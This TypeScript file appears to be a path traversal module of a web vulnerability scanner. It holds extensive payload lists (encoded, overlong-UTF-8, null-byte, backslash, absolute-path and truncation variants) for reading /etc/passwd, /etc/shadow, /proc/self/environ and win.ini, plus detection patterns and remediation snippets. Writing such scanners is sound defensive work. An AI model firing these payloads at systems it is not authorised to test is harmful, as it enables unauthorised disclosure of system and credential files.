import type { ScanModule, Finding } from "../types";
import { scanFetch } from "../fetch";

const TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..%2f..%2f..%2fetc%2fpasswd",
  "....//....//....//etc/passwd",
  "..\\..\\..\\etc\\passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "../../../etc/shadow",
  "..%252f..%252f..%252fetc%252fpasswd",
  "../../../windows/win.ini",
  // Unicode/UTF-8 overlong encoding variants
  "..%c0%af..%c0%af..%c0%afetc/passwd",        // UTF-8 overlong /
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", // Fullwidth solidus ／
  "..%c1%9c..%c1%9c..%c1%9cetc/passwd",         // UTF-8 overlong \
  "..%u2216..%u2216..%u2216etc/passwd",          // Unicode set minus ∖
  "..%u2215..%u2215..%u2215etc/passwd",          // Unicode division slash ∕
  // Dot segment variations
  ".%2e/.%2e/.%2e/etc/passwd",
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
  "..%00/..%00/..%00/etc/passwd",                // Null byte in path segment
  // Double URL-encoded traversal (bypass naive single-decode filters)
  "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
  "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
  "..%252f..%252f..%252fwindows%252fwin.ini",
  // Triple URL-encoded traversal
  "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
  // Windows-specific path traversal
  "..\\..\\..\\windows\\win.ini",
  "..%5c..%5c..%5cwindows%5cwin.ini",
  "..%255c..%255c..%255cwindows%255cwin.ini",     // Double-encoded backslash
  "....\\\\....\\\\....\\\\etc\\\\passwd",         // Dot-dot-backslash doubling
  "....//....//....//windows/win.ini",            // Dot-dot-slash doubling
  "..%5c..%5c..%5cetc%5cpasswd",
];

const TRAVERSAL_INDICATORS = [
  /root:.*:0:0/,                      // /etc/passwd
  /daemon:.*:\/usr/,                   // /etc/passwd
  /nobody:.*:\/nonexistent/,           // /etc/passwd
  /\[extensions\]/i,                   // win.ini
  /\[fonts\]/i,                        // win.ini
  /\[mail\]/i,                         // win.ini
  /; for 16-bit app support/i,         // win.ini / system.ini
  /\[boot loader\]/i,                  // boot.ini
  /\[operating systems\]/i,            // boot.ini
];

const NULL_BYTE_PAYLOADS = [
  "../../../etc/passwd%00.png",
  "../../../etc/passwd%00.jpg",
  "../../../etc/passwd\x00.html",
  "../../../etc/passwd%00.gif",
  "../../../etc/passwd%00.pdf",
  "../../../etc/passwd%00.txt",
  "..\\..\\..\\windows\\win.ini%00.jpg",
  "../../../etc/shadow%00.png",
  // Double-encoded null byte
  "../../../etc/passwd%2500.jpg",
];

export const pathTraversalModule: ScanModule = async (target) => {
  const findings: Finding[] = [];
  let count = 0;

  // Collect endpoints that might serve files: pages with path params, API endpoints with file-like params
  const testEndpoints: { url: string; paramName: string }[] = [];

  for (const endpoint of target.apiEndpoints) {
    try {
      const url = new URL(endpoint);
      for (const [key] of url.searchParams) {
        if (/file|path|name|doc|page|template|include|dir|folder|src|img|image|download|load|read|view/i.test(key)) {
          testEndpoints.push({ url: endpoint, paramName: key });
        }
      }
    } catch { /* skip */ }
  }

  for (const page of target.pages) {
    try {
      const url = new URL(page);
      for (const [key] of url.searchParams) {
        if (/file|path|name|doc|page|template|include|dir|folder|src|img|image|download|load|read|view/i.test(key)) {
          testEndpoints.push({ url: page, paramName: key });
        }
      }
    } catch { /* skip */ }
  }

  // Also try common file-serving param names on API endpoints
  for (const endpoint of target.apiEndpoints.slice(0, 5)) {
    for (const param of ["file", "path", "filename", "page", "template", "doc", "download"]) {
      testEndpoints.push({ url: endpoint, paramName: param });
    }
  }

  // Deduplicate
  const seen = new Set<string>();
  const deduped = testEndpoints.filter((t) => {
    const key = `${new URL(t.url).pathname}:${t.paramName}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  // Get baseline — fetch with a normal value to check for false positives
  const baselineTexts = new Map<string, string>();
  await Promise.allSettled(
    deduped.slice(0, 15).map(async (t) => {
      const url = new URL(t.url);
      url.searchParams.set(t.paramName, "normal_file.txt");
      const res = await scanFetch(url.href, { timeoutMs: 5000 });
      const text = await res.text();
      baselineTexts.set(`${new URL(t.url).pathname}:${t.paramName}`, text);
    }),
  );

  const flagged = new Set<string>();

  // Parallelize: test all endpoints with all payloads concurrently
  const allPayloads = [...TRAVERSAL_PAYLOADS, ...NULL_BYTE_PAYLOADS];
  const traversalTests: Promise<void>[] = [];

  for (const t of deduped.slice(0, 15)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    const baseText = baselineTexts.get(key) || "";
    if (TRAVERSAL_INDICATORS.some((p) => p.test(baseText))) continue;

    traversalTests.push(
      (async () => {
        if (flagged.has(key)) return;
        const results = await Promise.allSettled(
          allPayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 5000 });
            return { payload, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
            flagged.add(key);
            const isNullByte = payload.includes("%00") || payload.includes("\x00") || payload.includes("%2500");
            const isEncodingBypass = /%25/.test(payload) && !isNullByte;
            const isWindowsPath = /\\/.test(payload) || /%5c/i.test(payload) || /win\.ini/i.test(payload);
            const variant = isNullByte ? "null-byte" : isEncodingBypass ? "encoding-bypass" : isWindowsPath ? "windows" : "standard";
            findings.push({
              id: `path-traversal-${variant}-${count++}`,
              module: "Path Traversal",
              severity: "critical",
              title: isNullByte
                ? `Path traversal via null byte on ${pathname}`
                : isEncodingBypass
                ? `Path traversal via URL encoding bypass on ${pathname}`
                : isWindowsPath
                ? `Windows path traversal on ${pathname} (param: ${t.paramName})`
                : `Path traversal on ${pathname} (param: ${t.paramName})`,
              description: isNullByte
                ? "A null byte in the file path bypassed extension validation, allowing reading of arbitrary files."
                : isEncodingBypass
                ? "A double/triple URL-encoded traversal payload bypassed input filters that only decode once. The server decoded the path multiple times, allowing directory traversal."
                : isWindowsPath
                ? "A Windows-style path traversal payload (using backslashes) returned sensitive file contents. The backend may be Windows-hosted or accepts both slash types."
                : "A directory traversal payload returned sensitive system file contents. Attackers can read any file on the server.",
              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation: isEncodingBypass
                ? "Canonicalize paths before validation by fully decoding URL-encoded input. Apply path validation after all decoding steps, then verify the resolved path stays within the allowed directory."
                : isWindowsPath
                ? "Normalize path separators (replace \\\\ with /) before validation. Use path.resolve() and verify the resolved path stays within the intended directory. Consider blocking backslash characters in file path inputs."
                : "Never use user input directly in file paths. Use path.resolve() and verify the resolved path stays within the intended directory.",
              codeSnippet: isNullByte
                ? `// Strip null bytes and validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst clean = req.query.file.replace(/\\0/g, "");\nconst resolved = path.resolve(SAFE_DIR, clean);\nif (!resolved.startsWith(SAFE_DIR)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
                : isEncodingBypass
                ? `// Fully decode then validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nlet decoded = req.query.file;\nlet prev = "";\nwhile (decoded !== prev) { prev = decoded; decoded = decodeURIComponent(decoded); }\nconst resolved = path.resolve(SAFE_DIR, decoded);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
                : isWindowsPath
                ? `// Normalize separators then validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst normalized = req.query.file.replace(/\\\\/g, "/");\nconst resolved = path.resolve(SAFE_DIR, normalized);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
                : `// Resolve the path and ensure it stays inside the allowed directory\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst resolved = path.resolve(SAFE_DIR, req.query.file);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}\nconst data = fs.readFileSync(resolved);`,
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }

  // URL path segment traversal (parallel)
  const fileEndpoints = target.apiEndpoints.filter((ep) =>
    /file|download|image|asset|static|upload|doc|media/i.test(ep),
  );
  for (const endpoint of fileEndpoints.slice(0, 5)) {
    const url = new URL(endpoint);
    const basePath = url.pathname;
    traversalTests.push(
      (async () => {
        const results = await Promise.allSettled(
          ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"].map(async (traversal) => {
            const testUrl = `${url.origin}${basePath}/${traversal}`;
            const res = await scanFetch(testUrl, { timeoutMs: 5000 });
            return { testUrl, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled") continue;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(r.value.text))) {
            findings.push({
              id: `path-traversal-url-${count++}`,
              module: "Path Traversal",
              severity: "critical",
              title: `Path traversal in URL path at ${basePath}`,
              description: "Directory traversal sequences in the URL path returned system file contents.",
              evidence: `URL: ${r.value.testUrl}\nResponse excerpt: ${r.value.text.substring(0, 200)}`,
              remediation: "Validate and sanitize URL path segments. Block traversal sequences in middleware.",
              codeSnippet: `// Middleware: block path traversal sequences in URL segments\nimport { NextResponse } from "next/server";\nexport function middleware(req) {\n  const decoded = decodeURIComponent(req.nextUrl.pathname);\n  if (/\\.\\.[\\/\\\\]/.test(decoded)) {\n    return NextResponse.json({ error: "Invalid path" }, { status: 400 });\n  }\n  return NextResponse.next();\n}\nexport const config = { matcher: "/api/:path*" };`,
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }

  await Promise.allSettled(traversalTests);

  // --- Phase 3: URL-encoded traversal (double-encode & overlong UTF-8) ---
  const urlEncodedPayloads = [
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini",
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd",
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows/win.ini",
    "..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%af..%c0%ae%c0%afetc/passwd",
    "%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc/passwd",
    "..%25c0%25ae..%25c0%25ae..%25c0%25afetc/passwd",
  ];

  const urlEncodedTests: Promise<void>[] = [];
  for (const t of deduped.slice(0, 15)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    if (flagged.has(key)) continue;

    urlEncodedTests.push(
      (async () => {
        const results = await Promise.allSettled(
          urlEncodedPayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 5000 });
            return { payload, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
            flagged.add(key);
            findings.push({
              id: `path-traversal-url-encoded-${count++}`,
              module: "path-traversal",
              severity: "critical",
              title: `URL-encoded path traversal bypass on ${pathname} (param: ${t.paramName})`,
              description:
                "Double URL-encoded or overlong UTF-8 encoded traversal sequences bypassed input filters. The server decoded the path multiple times or accepted malformed UTF-8, allowing directory traversal to read arbitrary files.",
              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation:
                "Canonicalize all input by fully decoding URL-encoded values in a loop until stable before validating. Reject overlong UTF-8 sequences. Validate the resolved path stays within the allowed directory after all normalization.",
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }
  await Promise.allSettled(urlEncodedTests);

  // --- Phase 4: Null byte injection ---
  const nullBytePayloads = [
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.png",
    "../../../etc/passwd%00.gif",
    "../../../etc/passwd%00.txt",
    "../../../etc/passwd%00.html",
    "../../../etc/shadow%00.css",
    "..\\..\\..\\windows\\win.ini%00.jpg",
    "../../../etc/passwd%2500.jpg",
    "../../../etc/passwd%00%00.jpg",
    "../../../etc/passwd\x00.bmp",
  ];

  const nullByteTests: Promise<void>[] = [];
  for (const t of deduped.slice(0, 15)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    if (flagged.has(key)) continue;

    nullByteTests.push(
      (async () => {
        const results = await Promise.allSettled(
          nullBytePayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 5000 });
            return { payload, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
            flagged.add(key);
            findings.push({
              id: `path-traversal-null-byte-${count++}`,
              module: "path-traversal",
              severity: "critical",
              title: `Null byte path traversal on ${pathname} (param: ${t.paramName})`,
              description:
                "A null byte (%00) injected into the file path truncated the filename before the extension check, allowing the server to return the contents of an arbitrary system file. This indicates the backend is vulnerable to null byte injection in file path handling.",
              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation:
                "Strip all null bytes (\\x00, %00) from user input before using it in file paths. Upgrade to a language runtime that rejects null bytes in path operations. Validate the resolved path stays within the allowed directory.",
              cwe: "CWE-158",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }
  await Promise.allSettled(nullByteTests);

  // --- Phase 5: Dot-dot-backslash (Windows) variants ---
  const windowsBackslashPayloads = [
    "..\\..\\..\\etc\\passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    "..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    "..%255c..%255c..%255cetc%255cpasswd",
    "..%5c..%2f..%5c..%2fetc/passwd",
    "..\\../..\\../..\\../etc/passwd",
  ];

  const windowsTests: Promise<void>[] = [];
  for (const t of deduped.slice(0, 15)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    if (flagged.has(key)) continue;

    windowsTests.push(
      (async () => {
        const results = await Promise.allSettled(
          windowsBackslashPayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 5000 });
            return { payload, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
            flagged.add(key);
            findings.push({
              id: `path-traversal-windows-backslash-${count++}`,
              module: "path-traversal",
              severity: "critical",
              title: `Windows backslash path traversal on ${pathname} (param: ${t.paramName})`,
              description:
                "Backslash-based directory traversal (..\\\\) returned sensitive file contents. The server accepts Windows-style path separators or fails to normalize backslashes before path resolution, allowing attackers to escape the intended directory.",
              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation:
                "Normalize all path separators by replacing backslashes with forward slashes before validation. Use path.resolve() and verify the resolved path stays within the intended directory. Consider rejecting requests containing backslashes in file path parameters.",
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }
  await Promise.allSettled(windowsTests);

  // --- Phase 6: Absolute path injection ---
  const absolutePathPayloads = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "/proc/self/cmdline",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "\\\\localhost\\c$\\windows\\win.ini",
    "//etc/passwd",
    "file:///etc/passwd",
  ];

  const absolutePathIndicators = [
    ...TRAVERSAL_INDICATORS,
    /localhost|127\.0\.0\.1/,          // /etc/hosts
    /PROCESSOR|SystemRoot|COMPUTERNAME/i, // /proc/self/environ or Windows env
    /Linux version/,                    // /proc/version
  ];

  const absolutePathTests: Promise<void>[] = [];
  for (const t of deduped.slice(0, 15)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    if (flagged.has(key)) continue;

    absolutePathTests.push(
      (async () => {
        const results = await Promise.allSettled(
          absolutePathPayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 5000 });
            return { payload, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (absolutePathIndicators.some((p) => p.test(text))) {
            flagged.add(key);
            findings.push({
              id: `path-traversal-absolute-${count++}`,
              module: "path-traversal",
              severity: "critical",
              title: `Absolute path injection on ${pathname} (param: ${t.paramName})`,
              description:
                "An absolute file path supplied in a parameter returned sensitive system file contents. The server uses user input directly in file operations without restricting to a base directory, allowing unrestricted file read access.",
              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation:
                "Never allow absolute paths in user input. Strip leading slashes and drive letters. Use path.resolve() relative to a safe base directory and verify the result starts with that base directory before serving the file.",
              cwe: "CWE-36",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }
  await Promise.allSettled(absolutePathTests);

  // --- Phase 7: Path truncation (long path) ---
  const longPadding = "A".repeat(4000);
  const truncationPayloads = [
    `../../../etc/passwd/${longPadding}`,
    `../../../etc/passwd/.${longPadding}`,
    `../../../etc/passwd${longPadding}`,
    `../${longPadding}/../../../../etc/passwd`,
    `../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.`,
    `${"../".repeat(200)}etc/passwd`,
    `${"..\\".repeat(200)}windows\\win.ini`,
  ];

  const truncationTests: Promise<void>[] = [];
  for (const t of deduped.slice(0, 10)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    if (flagged.has(key)) continue;

    truncationTests.push(
      (async () => {
        const results = await Promise.allSettled(
          truncationPayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 8000 });
            return { payload: payload.substring(0, 80) + "...", text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
            flagged.add(key);
            findings.push({
              id: `path-traversal-truncation-${count++}`,
              module: "path-traversal",
              severity: "high",
              title: `Path truncation traversal on ${pathname} (param: ${t.paramName})`,
              description:
                "An extremely long file path was truncated by the server to a valid traversal path, returning sensitive file contents. This indicates the backend truncates paths at a fixed buffer size before resolving them, which can be exploited to bypass path validation.",
              evidence: `Payload (truncated): ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation:
                "Enforce a strict maximum length on file path parameters before any processing. Reject requests with excessively long path values. Validate the resolved path stays within the intended directory after all normalization.",
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }
  await Promise.allSettled(truncationTests);

  return findings;
};
